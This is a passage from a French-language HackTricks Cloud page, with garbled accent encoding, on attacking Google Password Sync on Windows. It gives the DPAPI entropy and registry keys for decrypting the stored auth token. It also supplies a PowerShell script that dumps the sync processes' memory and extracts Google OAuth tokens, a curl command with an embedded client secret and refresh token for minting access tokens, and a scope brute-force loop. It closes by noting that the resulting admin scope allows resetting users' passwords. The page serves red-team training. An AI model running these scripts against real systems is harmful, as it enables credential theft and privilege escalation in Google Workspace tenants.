Le jeton chiffr√© (le cas √©ch√©ant) se trouve dans la cl√© **`AuthToken`** et est chiffr√© √† l'aide de l'API **`CryptProtectData`**. Pour le d√©chiffrer, vous devez √™tre le m√™me utilisateur que celui qui a configur√© la synchronisation des mots de passe et utiliser cette **entropie** lors de l'utilisation de **`CryptUnprotectData`** : `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
De plus, il est √©galement encod√© en base32hex avec le dictionnaire **`0123456789abcdefghijklmnopqrstv`**.

Les valeurs d'entropie ont √©t√© trouv√©es en utilisant l'outil. Il a √©t√© configur√© pour surveiller les appels √† **`CryptUnprotectData`** et **`CryptProtectData`** et ensuite l'outil a √©t√© utilis√© pour lancer et surveiller `PasswordSync.exe` qui d√©chiffrera le mot de passe configur√© et le jeton d'authentification au d√©but et l'outil affichera **les valeurs pour l'entropie utilis√©e** dans les deux cas :

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Notez qu'il est √©galement possible de voir les **valeurs d√©chiffr√©es** dans l'entr√©e ou la sortie des appels √† ces API √©galement (au cas o√π √† un moment donn√© Winpeas cesserait de fonctionner).

Dans le cas o√π la synchronisation des mots de passe a √©t√© **configur√©e avec des identifiants SA**, elle sera √©galement stock√©e dans des cl√©s √† l'int√©rieur du registre **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Dumping des jetons depuis la m√©moire

Tout comme avec GCPW, il est possible de dumper la m√©moire du processus des processus `PasswordSync.exe` et `password_sync_service.exe` et vous pourrez trouver des jetons d'actualisation et d'acc√®s (s'ils ont d√©j√† √©t√© g√©n√©r√©s).\
Je suppose que vous pourriez √©galement trouver les identifiants configur√©s de l'AD.

<details>

<summary>Dump <code>PasswordSync.exe</code> et les processus <code>password_sync_service.exe</code> et rechercher des jetons</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - G√©n√©ration de jetons d'acc√®s √† partir de jetons d'actualisation

En utilisant le jeton d'actualisation, il est possible de g√©n√©rer des jetons d'acc√®s en utilisant celui-ci ainsi que l'ID client et le secret client sp√©cifi√©s dans la commande suivante :
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
Notez qu'il n'est pas possible de demander n'importe quel scope pour le token d'acc√®s m√™me en ayant un refresh token, car vous ne pouvez demander que les **scopes pris en charge par l'application o√π vous g√©n√©rez le token d'acc√®s**.

De plus, le refresh token n'est pas valide dans toutes les applications.
{% endhint %}

Par d√©faut, GPS n'aura pas acc√®s en tant qu'utilisateur √† tous les scopes OAuth possibles, donc en utilisant le script suivant, nous pouvons trouver les scopes qui peuvent √™tre utilis√©s avec le `refresh_token` pour g√©n√©rer un `access_token` :

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Et voici la sortie que j'ai obtenue au moment de l'√©criture :
```
https://www.googleapis.com/auth/admin.directory.user
```
Ce qui est le m√™me que celui que vous obtenez si vous n'indiquez aucun champ.

{% hint style="danger" %}
Avec ce champ, vous pourriez **modifier le mot de passe d'un utilisateur existant pour √©lever les privil√®ges**.
{% endhint %}

## R√©f√©rences

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
